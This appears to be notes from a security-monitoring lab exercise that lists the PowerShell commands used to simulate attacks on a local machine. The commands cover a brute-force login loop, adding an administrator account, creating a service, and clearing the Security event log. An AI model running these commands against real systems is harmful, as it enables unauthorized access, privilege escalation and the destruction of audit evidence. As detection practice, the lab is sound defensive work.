1. Brute Force Login Attack.
	PowerShell script used:

		$users = "admin", "test", "vboxuser"
		$passwords = "123456", "password", "admin", "wrongpass", "letmein"
		
		for ($i = 0; $i -lt 20; $i++) {
			$u = Get-Random $users
			$p = Get-Random $passwords
			
			net use \\127.0.0.1 /user:$u $p
			
			Start-Sleep -Milliseconds 300
		}
	
3. Unauthorized new user creation.
	PowerShell command used:
		net user soc_test_user ********* /add

4. User privilege escalation.
	PowerShell command used:
		net localgroup administrators soc_test_user /add
		
5. Service creation.
	PowerShell command used:
		sc.exe create trustedService binPath= "C:\Windows\System32\notepad.exe"
		
6. Attempting to clear the machine's logs.
	PowerShell command used:
		wevtutil cl Security
